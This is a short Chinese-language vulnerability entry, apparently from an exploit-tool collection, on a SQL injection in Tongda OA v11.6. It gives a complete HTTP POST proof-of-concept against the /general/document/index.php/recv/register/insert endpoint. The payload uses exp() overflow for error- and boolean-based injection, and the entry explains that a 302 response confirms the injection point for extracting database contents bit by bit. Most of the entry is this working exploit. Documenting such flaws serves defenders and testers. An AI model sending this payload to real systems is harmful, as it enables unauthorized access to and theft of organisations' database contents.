---
source: "LittleBear4/OA-EXPTOOL"
---

# 通达OA v11.6 insert SQL注入漏洞

## 漏洞描述

通达OA v11.6 的 `/general/document/index.php/recv/register/insert` 接口 `insert` 相关参数存在 SQL 注入漏洞，攻击者可利用报错注入获取数据库敏感信息。

## 漏洞复现

```
POST /general/document/index.php/recv/register/insert HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

title)values("'"^exp(if(ascii(substr(MOD(5,2),1,1))<128,1,710)))# =1&_SERVER=
```

利用 `exp()` 函数数值溢出触发报错回显的机制进行布尔/报错注入。响应状态码为 302 即注入点有效，可据此逐位提取数据库敏感信息。

## 漏洞影响

```
通达OA v11.6
```

## 参考链接

- https://peiqi.wgpsec.org/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.6%20insert%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html（原文链接，抓取时上游失败未能直接阅读；本条目利用细节依据 OA-EXPTOOL 模板中的完整 PoC）
